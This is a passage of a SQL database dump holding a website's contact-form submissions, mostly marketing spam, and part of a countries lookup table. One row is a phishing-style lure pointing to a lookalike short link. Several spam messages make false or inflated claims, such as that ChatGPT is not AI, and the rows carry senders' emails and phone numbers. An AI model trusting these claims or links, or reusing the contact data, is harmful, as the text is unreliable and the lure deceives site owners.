(46, 'Meagan', 'O\'Connor', 'meagan.oconnor@yahoo.com', '', 'Businesses that get Vetted are running circles around their competition that just keeps pouring more money into leads & advertising.\r\nVetted builds essential trust, transparency & credibility to help you close up to 60% more deals. \r\nStart your 30 Day FREE trial & see the results for yourself. \r\nUSA Businesses Only\r\n\r\nSarah McCormick\r\nVetted Business Specialist\r\n295 Seven Farms Drive Suite C-201\r\nCharleston, SC 29492\r\nSarah.McCormick@VettedPros.com\r\nhttps://vettedpros.com/1-2/?a=Are-You-Ready-To-Dominate-Your-Local-Market?\r\n\r\nVetted is a game changing platform used by over 85,000 USA based businesses to share & prove their business credentials to amplify trust & transparency with shoppers and close up to 60% more sales than businesses not listed on the Vetted platform.\r\n'),
(47, 'Shanky', 'Minns', 'youronlinepresence2@outlook.com', '', 'I\'m Shanky, a Social Media Marketing Manager with over 10 years of global experience. I specialize in creating tailored social media content calendars, designing branded content, conducting hashtag research, and scheduling posts. I work across Instagram, Facebook, LinkedIn, Twitter, and Pinterest to help boost your online presence and engagement. \r\n\r\nLet\'s connect at Youronlinepresence2@outlook.com to discuss it further.\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n'),
(48, 'Emily', 'Jones', 'emilyjones2250@gmail.com', '', 'Hi there,\r\n\r\nWe run a YouTube growth service, which increases your number of subscribers both safely and practically.\r\n\r\nWe go beyond just subscriber numbers. We focus on attracting viewers genuinely interested in your niche, leading to long-term engagement with your content. Our approach leverages optimization, community building, and content promotion for sustainable growth, not quick fixes. Additionally, a dedicated team analyzes your channel and creates a personalized plan to unlock your full potential, all without relying on bots.\r\n\r\nOur packages start from just $60 (USD) per month.\r\n\r\nWould this be of interest?\r\n\r\nKind Regards,\r\nEmily'),
(49, 'DRsYBfHPiwd', 'epnOPtAHFKumgX', 'vanessa_griffinzgos@outlook.com', '2266463709', 'XLYUWeHFIVd'),
(50, 'Arthur', 'Case', 'gptreels@vaulemedia.com', '', 'With GPTReels, you can create video reels in Flash (literally a few seconds) and sell it to unlimited clients - earn good profits for your services\r\n\r\nMore than 78% business owners rate using AI based reels as the #1 way to attract more visitors & convert them into happy customers.\r\n\r\nBut creating video reels was a very tough, energy-draining, time-consuming, and costly process.\r\n\r\nYes!\r\n\r\nThere are tons of tasks involved & missing even a single one leads to a complete rework right from scratch.\r\n\r\nNow, If you too wanna get a complete all-in-one solution for this menace…\r\n\r\nI’ve got some great news… Presenting GPT Reels\r\n\r\n[+] Creates Pro Quality Video Reels in seconds for any business in any language\r\n[+] First Video Reels Creator powered by GPT-4 AI Technology\r\n\r\n==> Show live demo : https://www.vaulemedia.com/gptreels \r\n\r\nA.I Does A to Z Steps To Create Beautiful Video Reels! Just Enter Keywords and It Will Give You...\r\n\r\nIdeas & Help Writing Scripts\r\nFinding Relevant Videos & Images\r\nAdd Powerful Animation\r\nAdd Mesmerizing Music\r\nCreate Attractive Reels, Videos & Shorts\r\n\r\nBe it Website Videos, Ads, Promotional, Entertaining, Infomercial, Advertising, Learning Video…\r\n\r\nBig marketers are calling GPT Reels as BESTEST and FASTEST A.I Video Reel Creator in the new age of A.I era\r\n\r\nImagine creating any type of video reels in seconds\r\n\r\n...WITHOUT skills,\r\n...WITHOUT recording a single video\r\n...WITHOUT any budget\r\n...By entering just one Keyword and literally 3-clicks\r\n\r\nBEST Part Is: It comes with a commercial license, which means You can create video reels in Flash (literally a few seconds) and sell it to unlimited clients - earn good profits for your services\r\n\r\nNot to mention, GPT Reels has a 30-days money-back guarantee if you don\'t like it.\r\n\r\nOver 5000 business owners have bought GPT Reels lifetime deals in the last few days...\r\n\r\n==> Get GPT Reels Lifetime account at a one-time price now : https://www.vaulemedia.com/gptreels \r\n\r\nRegards,\r\nArthur Case\r\n\r\n\r\n\r\nUNSUBSCRIBE: https://www.vaulemedia.com/unsubscribe/?d=vendorscity.com \r\nAddress: 2144 Carolina Avenue\r\nCleburne, TX 76031\r\n'),
(51, 'Mike Calhoun\r\n', 'Mike Calhoun\r\n', 'petertrautttox@gmail.com', '81313457827', 'Greetings \r\n \r\nI have just checked  vendorscity.com for the ranking keywords and saw that your website could use a push. \r\n \r\nWe will increase your ranks organically and safely, using only state of the art AI and whitehat methods, while providing monthly reports and outstanding support. \r\n \r\nMore info: \r\nhttps://www.digital-x-press.co/unbeatable-seo/ \r\n \r\nRegards \r\nMike Calhoun\r\n \r\nDigital X SEO Experts \r\nhttps://www.digital-x-press.co/whatsapp-us/');
INSERT INTO `contact_us` (`id`, `fname`, `lname`, `email`, `mobile`, `message`) VALUES
(52, 'Krish', 'Roy', 'outsourcedigitalmarketing@outlook.com', '', 'Are you looking for a content writer or copywriter who can write according to your ideas, follow your specific tone and style, and keep your audience in mind? I specialize in crafting content that is easy to read and consistent from start to finish. I currently work with many clients, interacting with their teams via video calls to ensure everything runs smoothly. Sometimes, clients ask me to conduct keyword research and plan content topics and points to cover. I also ensure all content is SEO-friendly. My experience includes writing blogs, articles, website copy, e-commerce product descriptions, e-books, and SEO content. I am happy to work within your budget. \r\n\r\nFeel free to reach out to me at outsourcedigitalmarketing@outlook.com \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n'),
(53, 'Freddy', 'Byrd', 'aipilot@moregold.xyz', '', 'How would you like to have a business of your own with zero investment without writing a single line of code and you keep 100% profit to yourself?\r\n\r\nIncredible right?\r\n\r\nThis is exactly what our Super  Smart AI App;   AI Pilot will do for you!\r\n\r\n>>> Check it out (DEMO): https://www.moregold.xyz/aipilot \r\n\r\nAI Pilot will create and manage a business for you from scratch and produces real results without you having your hands on anything\r\n\r\nWith 50 AI Experts In Different Fields To help you Grow Your Business (e.g content writer, business coach, marketing expert, SEO analyst, motivational coach, chef, social media influencer, job interviewer, legal advisor, etc.)\r\n\r\nWith ZERO monthly payments And ZERO hidden fees…\r\n\r\nEvery day, we make hundreds of dollars Just by letting AI Pilot do the work for us…\r\n\r\nThe most amazing part is, whether you are an affiliate marketer, a ecom store owner,  an Internet Marketer or any business online, you can also embed those assistant bots into any website, blog or store.\r\n\r\nThis will save you times, stress, headache and money.\r\n\r\nJump on this offer, because the lifetime edition offer closes shortly!   Hurry!\r\n: https://www.moregold.xyz/aipilot \r\n\r\nCheers\r\nFreddy Byrd\r\n\r\n\r\nUNSUBSCRIBE: https://www.moregold.xyz/unsubscribe/?d=vendorscity.com \r\nAddress: 4711 White Oak Drive\r\nSaint Joseph, MO 64501'),
(54, 'Steve', 'Holte', 'steve.holte@hotmail.com', '', 'Hi, I was searching through Siri on my phone and I couldn’t find you.\r\n\r\nWe know how to flood your business with customers from Siri and the 4 other voice search platforms (Amazon Alexa, Google Assistant, Microsoft Copilot, and Samsung Bixby).\r\n\r\nNot only do we know how to register your business on these platforms, we know how to rank your business within the top 3 reach results to flood your business with high intent customers looking to buy.\r\n\r\nWould it be a bad idea to have your business be in the top 3 search results?\r\n\r\nI didn’t think so :)\r\n\r\n\r\nYou can learn more here:\r\n\r\nhttps://vocalseek.com/'),
(55, 'Elizabeth', 'Martinez', 'profitcourse@truevaule.xyz', '', 'Hi vendorscity.com,\r\n\r\nYou\'ve no-doubt heard about the success of Udemy and other eLearning platforms like it.\r\n\r\nLast year Udemy alone did in the range of $600-700 Million, and the industry as a whole is around $400 Billion.\r\n\r\nBut here\'s a dirty little secret about the business: Udemy isn\'t even making profits yet.\r\n\r\nOK, technically it\'s not a secret since they\'re a publicly-held company, but most of their instructors and customers are certainly not aware of it.\r\n\r\nAlong with their competitors in the industry, they\'re focused on growth, and as a result they\'re losing tens of millions of dollars every quarter.\r\n\r\nThat\'s not to say that it\'s a bad business, or won\'t become profitable.\r\n\r\nHowever, I bring this up to make two points:\r\n\r\n1) There\'s a better way for most of us to start an eLearning business.\r\n\r\n2) You really can compete with platforms like Udemy.\r\n\r\nHere\'s a brand new AI solution that allowed you to start your own Udemy-like academies in a matter of minutes: https://www.truevaule.xyz/profitcourse \r\n\r\nWhile companies like Udemy are building their business like a typical startup in the world of Fortune 500 companies (raising gazillions from investors, taking years to become profitable, etc.), individual entrepreneurs can create a profitable business immediately.\r\n\r\nNo red tape to cut through.   No investors to keep happy and pay back.   You can start for pennies and be profitable from day one.\r\n\r\nIn that sense, you REALLY can compete with platforms like Udemy.\r\n\r\nUsing this new AI platform called CourseMateAi, you can also compete with them in other ways.\r\n\r\nBy harnessing the power of AI, you can generate new courses on any topic, at any time.\r\n\r\nThat gives you an edge over those other platforms.   Suppose there is a new trend or breakthrough in a niche.   You can create a course with the AI and launch it within minutes, while instructors on Udemy are scrambling for weeks to do the same.\r\n\r\nAgain, all this is not to say that the mega-platforms like Udemy and Coursera are bad.   Just to say that you can beat them at their own game by leveraging this new technology today: https://www.truevaule.xyz/profitcourse \r\n\r\nRight now CourseMateAi is super affordable during the launch special, but the price will be increasing to a monthly subscription due to huge demand.   Get in now before it\'s too late.\r\n\r\nTo your success,\r\n\r\nElizabeth Martinez\r\n\r\nUNSUBSCRIBE: https://www.truevaule.xyz/unsubscribe/?d=vendorscity.com  \r\nAddress: 1366 Kildeer Drive\r\nNorfolk, VA 23504'),
(56, 'Bryon', 'Cass', 'bryon.cass78@gmail.com', '', 'Hey there,\r\n\r\nImagine this: potential customers searching for your business, but vendorscity.com is nowhere to be found on Google. Frustrating, right?\r\n\r\nOur AI-powered app, built with ChatGPT-4o technology, can help you:\r\n\r\n1. Unearth hidden potential: SEOBuddy AI analyzes your website and identifies areas for improvement. No more wondering why you\'re stuck on page 3!\r\n2. Rise to the top: Boost your ranking on Google, Yahoo, and Bing, bringing more qualified traffic to your website.\r\n3. Effortless content creation: Generate unique and SEO-friendly content that keeps visitors engaged.\r\n4. Build & secure: Create a user-friendly website with voice commands (no coding required) and built-in security features.\r\n\r\nPlus, with SEOBuddy AI, you get access to powerful tools like:\r\n\r\n1. Competitor analysis - See what\'s working for your competition.\r\n2. Backlink creation - Earn valuable backlinks to improve your authority.\r\n3. Keyword research - Target the right keywords to get found by the right audience.\r\n4. Social media sharing - Expand your reach and drive traffic to your website.\r\n\r\nLimited-time offer: A one-time price of just $17 (normally $97).\r\n\r\nClick here to learn more: https://furtherinfo.org/r34u'),
(57, 'Henrietta', 'Hentze', 'henrietta.hentze@gmail.com', '', 'hey\r\n\r\nIt\'s been some time since we last communicated, but I just got emailed a warning article online about vendorscity.com and thought it was important to reach out to confirm this article. \r\n\r\nIt looks like there\'s some negative press that could be potentially damaging. \r\nBeing aware of how quickly rumors can spiral and not wanting you to be taken by surprise, I felt the need to notify you.\r\n\r\nHere\'s the source of the info:\r\n\r\nhttps://ibit.ly/Krket		\r\n\r\nI\'m hoping it\'s all a simple confusion, but I thought it best you should know!\r\n\r\nWishing you all the best,\r\nHenrietta\r\n'),
(58, 'Amy', 'Oviedo', 'craigslisttraffic@busitoday.co', '', 'Hi,\r\n\r\n“I can’t believe it!”\r\n\r\nThat’s what everyone is saying after discovering our mind-blowing Craigslist hack.     We’ve cracked the code to transform Craigslist into a traffic  goldmine/lead-generating powerhouse, and it’s ridiculously easy to implement.\r\n\r\nHere’s what you’ll learn:\r\n\r\nStep-by-Step Mastery: Instructions to set this up with ease\r\n\r\nSecret Sauce: The little-known tweaks that create huge impacts\r\n\r\nReal Stories: Success tales from people just like you\r\n\r\nThis isn’t just another marketing gimmick.     It’s a proven strategy that anyone can use, no matter your level of experience.\r\n\r\nReady to see the magic for yourself?     Click the link below to get started.\r\n\r\n: https://www.busitoday.co/craigslisttraffic \r\n\r\nTo your incredible success,\r\nAmy Oviedo\r\n\r\n\r\nUNSUBSCRIBE: https://www.busitoday.co/unsubscribe/?d=vendorscity.com  \r\nAddress: 917 Lauren Drive\r\nMadison, WI 53703'),
(59, 'Nancy', 'Locke', 'rocketclipsai@realdollar.xyz', '', 'Hey there,\r\n\r\nHave you ever wished there was a tool that could conjure up a unique video from just a keyword or phrase?\r\n\r\nHave you ever wished there was a tool that could transform your long videos into viral-worthy clips with just one click?\r\nWell, your wish has been granted with RocketClips AI!\r\n\r\n: https://www.realdollar.xyz/rocketclipsai \r\n\r\nWith the power of AI, this cutting-edge software streamlines your video editing process, making it easy for you to go viral like never before.\r\n\r\nHere\'s how it works:\r\n\r\nStep 1: Import from YouTube, Vimeo, or Upload MP4\r\nGone are the days of manual clip selection.   Simply import your video from YouTube, Vimeo, or upload an MP4 file directly to the platform.\r\n\r\nStep 2: Let AI Clip, Crop, Transcribe, and Process\r\nSit back and relax as our AI algorithms work their magic.   From clipping and cropping to transcribing your video content, it handles it all with precision and efficiency.\r\n\r\nStep 3: Publish To Your Social media Channels\r\nDownload and publish your newly crafted clips to your favourite social media platforms like YouTube, Instagram, TikTok, Facebook, and more.\r\n\r\n������ Experience the magic of RocketClips AI now: https://www.realdollar.xyz/rocketclipsai \r\n\r\nIt\'s never been easier to share your message with the world!\r\n\r\nHere’s the best part.   This AI-powered Video Editor comes packed with high-value tools to take your content to the next level:\r\n\r\n✅ AI Subtitles: Reach a global audience with automatically generated subtitles in 35 languages.\r\n✅ AI Clipping for highlight detection: Automatically identify and extract the most engaging moments from your videos.\r\n✅ Dynamic AI Captions: Create captivating captions that adapt to your content in real-time.\r\n\r\n������ Experience the magic of RocketClips AI now: https://www.realdollar.xyz/rocketclipsai \r\n\r\nExperience the future of video creation and sharing with RocketClips AI.   Whether you\'re a social media influencer, marketer, or content creator, this software has been designed to help you make an impact.\r\n\r\nReady to elevate your social media game?   Get started with RocketClips AI today!\r\n\r\n������ Experience the magic of RocketClips AI now: https://www.realdollar.xyz/rocketclipsai \r\n\r\nLooking forward to seeing you succeed,\r\nNancy Locke\r\n\r\n\r\n\r\nUNSUBSCRIBE: https://www.realdollar.xyz/unsubscribe/?d=vendorscity.com  \r\nAddress: 3848 Filbert Street\r\nUpper Darby, PA 19082\r\n'),
(60, 'Andrew', 'Corlett', 'aipilot@solveques.xyz', '', 'If you have ever used ChatGPT\r\n\r\nIt will shock you to know that  ChatGPT acts only on outdated 2021 data (contents, designs, funnels nor does it creates a website )\r\n\r\nThat\'s why smart marketers don\'t use it again...\r\n\r\nBut here is a 100x perfect solution. <<< No Monthly Fee: https://www.solveques.xyz/aipilot \r\n\r\nAI Pilot is the first AI assistant with 85+ Chatbots that works for you.\r\n\r\nAnything generated is Fresh from scratch… Not used by anyone.\r\n\r\nAnd this is why making 6 to 7 figures in your business will be super easy\r\n\r\nHere are some of AI Pilot Features;\r\n\r\nGenerates Content, Codes and Chatbots\r\nGenerates Social Proofs\r\nCreate Websites, Landing Page and Designs\r\nGenerates AI Flipbooks\r\nGenerates Human-like Voiceovers\r\nInteractive Element\r\nCreate Funnels\r\nGenerates Business Cards\r\n\r\nGenerates 3D Models and Videos\r\nAnd Much More.\r\n\r\n>>Click here to secure your access to this ever-green app, AI Pilot: https://www.solveques.xyz/aipilot \r\n\r\nIt’s time for you to stop spending money on hiring freelancers without making a profit.\r\n\r\nEven if you don’t know shit about marketing AI Pilot is the best place to start to profit HUGE consistently.\r\n\r\n>>See Proof here: https://www.solveques.xyz/aipilot \r\n\r\nThe best part is;\r\n\r\nYou can customize the AI Pilot App to transform your thoughts into reality,\r\n\r\nAnd this will catapult your business to the next level…\r\n\r\nWe are making over $542.43 per day with this system … you too can.\r\n\r\n>>Click here to secure your access to this ever-green app, AI Pilot: https://www.solveques.xyz/aipilot \r\n\r\nAndrew Corlett\r\n\r\n\r\n\r\nUNSUBSCRIBE: https://www.solveques.xyz/unsubscribe/?d=vendorscity.com  \r\nAddress: 3632 Poe Road\r\nJohns Island, SC 29455'),
(61, 'Mikel', 'Siebenhaar', 'siebenhaar.mikel@gmail.com', '', 'vendorscity.com Administrator, Greetings! I have just located your site, brief inquiry…\r\n\r\nMy name is Mikel, I located vendorscity.com after performing a quick search – you appeared up close to the peak of the search rankings, so whatever you’re working on for SEO, looks like it’s operating well.\r\n\r\nSo here is my question – what transpires AFTER an individual arrives on your website? Anything at all?\r\n\r\nData shows us at least 70% of the persons who locate your website, after a quick look-over, they vanish… for good.\r\n\r\nThis implies that all the hard work and effort you put into making them to arrive, goes the drain.\r\n\r\nWhy on earth would you desire all good work – and the fantastic website you’ve constructed – go waste?\r\n\r\nAs the probabilities are they’ll just skip over calling or even pulling out their mobile phone, leaving you in the lurch.\r\n\r\nBut however, here’s a thought for you… what you could make super-simple for someone raise their hand, say, “okay, let’s talk” without needing them to even pull their cell phone from their pocket to groundbreaking new software that can literally that first ever call happen NOW.\r\n\r\nWeb Visitors Into Leads is a software that sits your site, ready and waiting to capture any visitor’s. It lets know – so that you can talk to that lead while they’re still there at your site, strike the iron’s!\r\n\r\nCLICK HERE https://advanceleadgeneration.com to try a Live Demo with Web Visitors Into Leads now to see exactly how it works, when targeting leads, you HAVE to act fast – the difference between contacting within 5 minutes 30 minutes is huge – like 100 times!\r\n\r\nThat’s you should check our new SMS Text With Lead feature… once captured phone of the website visitor, you can automatically off a text with them.\r\n\r\nImagine how powerful could be – even if they don’t you up on your offer immediately, you can stay in touch them using text messages make new offers links great, and build your credibility, just this alone could be a game to make your website more effective when the iron’s!\r\n\r\nCLICK HERE https://advanceleadgeneration.com to learn about everything Web Visitors Into Leads can do your business be amazed, thanks and keep the great!\r\n\r\nMikel\r\nPS: Web Visitors Into Leads offers a FREE 14 days – you could converting to 100x more leads immediately! It even includes International Long Distance Calling wasting chasing eyeballs that don’t into paying customers. CLICK HERE https://advanceleadgeneration.com to try Visitors Into Leads.\r\n\r\nNow, if you\'d like to unsubscribe here https://advanceleadgeneration.com/unsubscribe.aspx?d=vendorscity.com\r\n\r\nJust quick note - the names and email used here, are placeholders real contact information. We value and wanted make you’re aware! If you wish get in touch with the real person behind message visit website, and we’ll connect you with the right\r\n'),
(62, 'Will', 'Elizabeth', 'will.elizabeth@gmail.com', '', 'Hi there,\r\n\r\nAre you tired of paying monthly fees for website hosting, cloud storage, and funnels?\r\n\r\nWe offer a revolutionary solution: host unlimited websites, files, and videos for a single, low one-time fee. No more monthly payments.\r\n\r\nHere\'s what you get:\r\n\r\nUltra-fast hosting powered by Intel® Xeon® CPU technology\r\nUnlimited website hosting\r\nUnlimited cloud storage\r\nUnlimited video hosting\r\nUnlimited funnel creation\r\nFree SSL certificates for all domains and files\r\n99.999% uptime guarantee\r\n24/7 customer support\r\nEasy-to-use cPanel\r\n365-day money-back guarantee\r\n\r\nPlus, get these exclusive bonuses when you act now:\r\n\r\n60+ reseller licenses (sell hosting to your clients!)\r\n10 Fast-Action Bonuses worth over $19,997 (including AI tools, traffic generation, and more!)\r\n\r\nDon\'t miss out on this limited-time offer! The price is about to increase, and this one-time fee won\'t last forever.\r\n\r\nClick here to learn more: https://furtherinfo.org/yarx\r\n\r\nWill\r\n\r\nIf you do not wish to receive any further offers:\r\nhttps://removeme.click/wp/unsubscribe.php?d=vendorscity.com'),
(63, 'Timothy', 'Inabinet', 'gptreels@nowbusiness.info', '', 'Hi there,\r\n\r\nDid you get your copy of GPT Reels (With a Commercial + Agency License yet)?\r\n\r\nIf not yet, then this is your final and last chance to get GPT Reels at a 1-Time Price.\r\n\r\n=> Click Here & Grab This Now Before it goes RECURRING : https://www.nowbusiness.info/gptreels \r\n\r\nNever run out of high quality pro video reels.\r\n\r\nLet AI create unlimited video reels in a flash.\r\n\r\nGPT Reels does ALL the Heavy Lifting by:\r\nCreating Ideas and scripts\r\nUsing its Built-In Storyboarding Feature\r\nFinding relevant images & video\r\nAdding animations & music\r\nAdd epic voice overs\r\nVia 100\'s of DFY templates or building from scratch...\r\n\r\n==>> Click Here To Grab GPT Reels + MY Bonuses: https://www.nowbusiness.info/gptreels \r\n\r\nNote: This is turning into monthly recurring very soon.\r\n\r\nRegards,\r\nTimothy Inabinet\r\n\r\n\r\nUNSUBSCRIBE: https://www.nowbusiness.info/unsubscribe/?d=vendorscity.com \r\nAddress: 1905 Catherine Drive\r\nWest Fargo, ND 58078\r\n'),
(64, 'Ronnie', 'Lewis', 'aipilot@enterprisetoday.info', '', 'Hey  \r\n\r\nSadly, it’s true...\r\n\r\nFor the past year, you have been trying dozens of apps…\r\n\r\nAnd I\'m here to tell you that this is NOT AI\r\n\r\nAt best, they\'re cheap mirror of ChatGPT, which is also not an AI app\r\n\r\nI know you may not believe me now…\r\n\r\nBut think about it…\r\n\r\n>> ChatGPT is not an AI app: https://www.enterprisetoday.info/aipilot \r\n\r\nIt just predicts the answers, and finds them on the internet\r\n\r\nAnd to make matters worse… It’s outdated.\r\n\r\nMeaning, ChatGPT only has access to information till 2021\r\n\r\nThis is a huge gap, especially in the day and age we live in…\r\n\r\nBut somehow, they convinced us that this is AI…\r\n\r\nI mean…\r\n\r\nTry to use ChatGPT to create something…\r\n\r\nTry to use it to create a funnel, or a website, you will be amazed by how bad it really is…\r\n\r\nDoes that mean you have to live like this?\r\nNever be able to use the true power of Ai?\r\n\r\nThe short answer is NO…\r\n\r\n I\'ve managed to create something…\r\n\r\nThat has never been done before…\r\n\r\n>> Click Here To Get the Tool: https://www.enterprisetoday.info/aipilot \r\n\r\nMe and my team have created the world’s first Ai app that uses a true Ai model\r\n\r\nA model that will literally do everything for you…\r\n\r\nWith a click of a button…\r\n\r\nOR…\r\n\r\nWith the sound of your voice…\r\n\r\nYes, you just use it’s Siri-like feature\r\n\r\nAnd it will create anything you want…\r\n\r\nCopywriting\r\nDesigns\r\nVideos\r\nLanding pages\r\nWebsites\r\nFunnels\r\nStores\r\nVoiceovers\r\n\r\nAnd more…\r\n\r\nBe sure to be around today at exactly 9:30AM\r\n\r\n>> Click Here Now To Get the Tool: https://www.enterprisetoday.info/aipilot \r\n\r\nTo make sure you get the BEST price possible\r\nAnd secure my insane bonuses pack\r\n\r\nSee you there…\r\nRonnie Lewis\r\n\r\n\r\nUNSUBSCRIBE: https://www.enterprisetoday.info/unsubscribe/?d=vendorscity.com  \r\nAddress: 1787 Lucy Lane\r\nRising Sun, IN 47040');

-- --------------------------------------------------------

--
-- Table structure for table `countries`
--

CREATE TABLE `countries` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `country` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `countries`
--

INSERT INTO `countries` (`id`, `country`, `created_at`, `updated_at`) VALUES
(22, 'UAE', '2023-11-11 00:12:30', '2023-11-11 00:12:30'),
(24, 'Afghanistan', '2024-05-30 04:59:54', '2024-05-30 04:59:54'),
(25, 'Albania', '2024-05-30 05:01:25', '2024-05-30 05:01:25'),
(26, 'Algeria', '2024-05-30 05:04:31', '2024-05-30 05:04:31'),
(27, 'American Samoa', '2024-05-30 05:04:46', '2024-05-30 05:04:46'),
(28, 'Andorra', '2024-05-30 05:04:59', '2024-05-30 05:04:59'),
(29, 'Angola', '2024-05-30 05:05:12', '2024-05-30 05:05:12'),
(30, 'Anguilla', '2024-05-30 05:05:21', '2024-05-30 05:05:21'),
(31, 'Antarctica', '2024-05-30 05:05:31', '2024-05-30 05:05:31'),
(32, 'Antigua and Barbuda', '2024-05-30 05:05:42', '2024-05-30 05:05:42'),
(33, 'Argentina', '2024-05-30 05:05:53', '2024-05-30 05:05:53'),
(34, 'Armenia', '2024-05-30 05:06:03', '2024-05-30 05:06:03'),
(35, 'Aruba', '2024-05-30 05:06:12', '2024-05-30 05:06:12'),
(36, 'Australia', '2024-05-30 05:06:23', '2024-05-30 05:06:23'),
(37, 'Austria', '2024-05-30 05:08:55', '2024-05-30 05:08:55'),
(38, 'Azerbaijan', '2024-05-30 05:09:09', '2024-05-30 05:09:09'),
(39, 'Bahamas', '2024-05-30 05:09:22', '2024-05-30 05:09:22'),
(40, 'Bahrain', '2024-05-30 05:09:35', '2024-05-30 05:09:35'),
(41, 'Bangladesh', '2024-05-30 05:09:45', '2024-05-30 05:09:45'),
(42, 'Barbados', '2024-05-30 05:09:54', '2024-05-30 05:09:54'),
(43, 'Belarus', '2024-05-30 05:10:00', '2024-05-30 05:10:00'),
(44, 'Belgium', '2024-05-30 05:10:08', '2024-05-30 05:10:08'),
(45, 'Belize', '2024-05-30 05:10:17', '2024-05-30 05:10:17'),
(46, 'Benin', '2024-05-30 05:10:25', '2024-05-30 05:10:25'),
(47, 'Bermuda', '2024-05-30 05:10:34', '2024-05-30 05:10:34'),
(48, 'Bhutan', '2024-05-30 05:10:45', '2024-05-30 05:10:45'),
(49, 'Bolivia', '2024-05-30 05:10:55', '2024-05-30 05:10:55'),
(50, 'Bosnia and Herzegowina', '2024-05-30 05:11:03', '2024-05-30 05:11:03'),
(51, 'Botswana', '2024-05-30 05:11:45', '2024-05-30 05:11:45'),
(52, 'Bouvet Island', '2024-05-30 05:14:50', '2024-05-30 05:14:50'),
(53, 'Brazil', '2024-05-30 05:14:59', '2024-05-30 05:14:59'),
(54, 'British Indian Ocean Territory', '2024-05-30 05:15:07', '2024-05-30 05:15:07'),
(55, 'Brunei Darussalam', '2024-05-30 05:15:17', '2024-05-30 05:15:17'),
(56, 'Bulgaria', '2024-05-30 05:15:24', '2024-05-30 05:15:24'),
(57, 'Burkina Faso', '2024-05-30 05:15:31', '2024-05-30 05:15:31'),
(58, 'Burundi', '2024-05-30 05:15:38', '2024-05-30 05:15:38'),
(59, 'Cambodia', '2024-05-30 10:51:07', '2024-05-30 10:51:07'),
(60, 'Cameroon', '2024-05-30 05:24:08', '2024-05-30 05:24:08'),
(61, 'Canada', '2024-05-30 05:24:15', '2024-05-30 05:24:15'),
(62, 'Cape Verde', '2024-05-30 05:24:25', '2024-05-30 05:24:25'),
(63, 'Cayman Islands', '2024-05-30 05:24:31', '2024-05-30 05:24:31'),
(64, 'Central African Republic', '2024-05-30 05:24:38', '2024-05-30 05:24:38'),
(65, 'Chad', '2024-05-30 05:24:46', '2024-05-30 05:24:46'),
(66, 'Chile', '2024-05-30 05:24:53', '2024-05-30 05:24:53'),
(67, 'China', '2024-05-30 05:25:00', '2024-05-30 05:25:00'),
(68, 'Christmas Island', '2024-05-30 05:25:07', '2024-05-30 05:25:07'),
(69, 'Cocos (Keeling) Islands', '2024-05-30 05:25:14', '2024-05-30 05:25:14'),
(70, 'Colombia', '2024-05-30 05:25:21', '2024-05-30 05:25:21'),
(71, 'Comoros', '2024-05-30 05:25:28', '2024-05-30 05:25:28'),
(72, 'Congo', '2024-05-30 05:25:35', '2024-05-30 05:25:35'),
(73, 'Congo, the Democratic Republic of the', '2024-05-30 05:25:43', '2024-05-30 05:25:43'),
(74, 'Cook Islands', '2024-05-30 05:26:01', '2024-05-30 05:26:01'),
(75, 'Costa Rica', '2024-05-30 05:26:10', '2024-05-30 05:26:10'),
(76, 'Cote d\'Ivoire', '2024-05-30 05:26:18', '2024-05-30 05:26:18'),
(77, 'Croatia (Hrvatska)', '2024-05-30 05:26:25', '2024-05-30 05:26:25'),
(78, 'Cuba', '2024-05-30 05:26:32', '2024-05-30 05:26:32'),
(79, 'Cyprus', '2024-05-30 05:26:40', '2024-05-30 05:26:40'),
(80, 'Czech Republic', '2024-05-30 05:26:47', '2024-05-30 05:26:47'),
(81, 'Denmark', '2024-05-30 05:26:53', '2024-05-30 05:26:53'),
(82, 'Djibouti', '2024-05-30 05:27:01', '2024-05-30 05:27:01'),
(83, 'Dominica', '2024-05-30 05:27:08', '2024-05-30 05:27:08'),
(84, 'Dominican Republic', '2024-05-30 05:27:15', '2024-05-30 05:27:15'),
(85, 'East Timor', '2024-05-30 05:27:24', '2024-05-30 05:27:24'),
(86, 'Ecuador', '2024-05-30 05:27:31', '2024-05-30 05:27:31'),
(87, 'Egypt', '2024-05-30 05:27:39', '2024-05-30 05:27:39'),
(88, 'El Salvador', '2024-05-30 05:27:47', '2024-05-30 05:27:47'),
(89, 'Equatorial Guinea', '2024-05-30 05:27:56', '2024-05-30 05:27:56'),
(90, 'Eritrea', '2024-05-30 05:28:02', '2024-05-30 05:28:02'),
(91, 'Estonia', '2024-05-30 05:28:13', '2024-05-30 05:28:13'),
(92, 'Ethiopia', '2024-05-30 05:28:24', '2024-05-30 05:28:24'),
(93, 'Falkland Islands (Malvinas)', '2024-05-30 05:28:31', '2024-05-30 05:28:31'),
(94, 'Faroe Islands', '2024-05-30 05:28:40', '2024-05-30 05:28:40'),
(95, 'Fiji', '2024-05-30 05:28:47', '2024-05-30 05:28:47'),
(96, 'Finland', '2024-05-30 05:28:55', '2024-05-30 05:28:55'),
(97, 'France', '2024-05-30 05:29:02', '2024-05-30 05:29:02'),
(98, 'France Metropolitan', '2024-05-30 05:29:14', '2024-05-30 05:29:14'),
(99, 'French Guiana', '2024-05-30 05:29:35', '2024-05-30 05:29:35'),
(100, 'French Polynesia', '2024-05-30 05:29:42', '2024-05-30 05:29:42'),
(101, 'French Southern Territories', '2024-05-30 05:29:49', '2024-05-30 05:29:49'),
(102, 'Gabon', '2024-05-30 05:29:59', '2024-05-30 05:29:59'),
(103, 'Gambia', '2024-05-30 05:30:09', '2024-05-30 05:30:09'),
(104, 'Georgia', '2024-05-30 05:30:17', '2024-05-30 05:30:17'),
(105, 'Germany', '2024-05-30 05:30:24', '2024-05-30 05:30:24'),
(106, 'Ghana', '2024-05-30 05:30:31', '2024-05-30 05:30:31'),
(107, 'Gibraltar', '2024-05-30 05:30:38', '2024-05-30 05:30:38'),
(108, 'Greece', '2024-05-30 05:30:44', '2024-05-30 05:30:44'),
(109, 'Greenland', '2024-05-30 05:30:50', '2024-05-30 05:30:50'),
(110, 'Grenada', '2024-05-30 05:31:04', '2024-05-30 05:31:04'),
